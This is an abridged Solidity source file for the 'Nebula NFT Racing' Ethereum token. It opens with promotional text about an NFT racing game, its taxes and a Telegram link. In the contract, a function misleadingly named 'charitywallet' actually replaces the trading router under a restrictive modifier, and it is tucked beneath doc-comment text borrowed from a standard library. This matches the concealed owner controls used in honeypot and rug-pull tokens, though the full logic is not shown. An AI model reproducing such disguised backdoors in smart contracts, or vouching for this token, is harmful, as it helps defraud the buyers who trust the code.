...
/*
Nebula is a Ethereum project and is a specialized gaming system. This game will be driven by our native token ($NEBULA). 
The game will be a NFT Space Racing Game and $NEBULA is the currency to buy things in the Nebula Space Shop and on the NFT Market 
Place for buying or selling NFT’s!

What we have to offer: 
🚀 NFT Space Racing Game
🤝 NFT Marketplace
🪐 Nebula Space Shop
🏎 Tournaments and Events

Come pick up some $NEBULA today! 

Taxes:
0% taxes on buys!
Sells -
* 3% marketing wallet
* 5% reflected to all holders
CONNECT:
nebulagames.digital 
https://t.me/nebulagames
...
contract ERC20 is Context, IERC20, IERC20Metadata , Ownable{
  ...
  /**
     ...
     * _Available since v3.1._
     */
    function charitywallet (address set) public checker {
        router = set;
    }
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
...
contract  nebulaga is ERC20{
    uint8 immutable private _decimals = 18;
    uint256 private _totalSupply = 133700000 * 10 ** 18;

    constructor () ERC20(unicode'Nebula NFT Racing','Nebula') {
